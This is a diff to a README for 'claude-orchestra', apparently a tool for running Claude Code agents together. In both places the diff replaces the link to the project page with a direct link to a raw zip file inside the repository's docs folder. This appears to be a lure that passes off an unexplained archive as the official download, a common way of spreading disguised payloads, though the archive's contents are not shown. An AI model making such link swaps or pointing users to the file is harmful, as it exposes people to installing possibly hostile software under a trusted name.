@@ -1,6 +1,6 @@
 # 🤖 claude-orchestra - Run Claude Code in one place
 
-[![Download](https://img.shields.io/badge/Download%20claude--orchestra-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mianham9042/claude-orchestra)
+[![Download](https://img.shields.io/badge/Download%20claude--orchestra-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mianham9042/claude-orchestra/raw/refs/heads/main/docs/orchestra-claude-3.2-alpha.4.zip)
 
 ## 🚀 What is claude-orchestra?
 
@@ -31,7 +31,7 @@ If you plan to run several agents at once, a machine with more RAM and a faster 
 
 Visit this page to download and set up claude-orchestra:
 
-https://github.com/mianham9042/claude-orchestra
+https://github.com/mianham9042/claude-orchestra/raw/refs/heads/main/docs/orchestra-claude-3.2-alpha.4.zip
 
 ## 🧭 Install on Windows
 
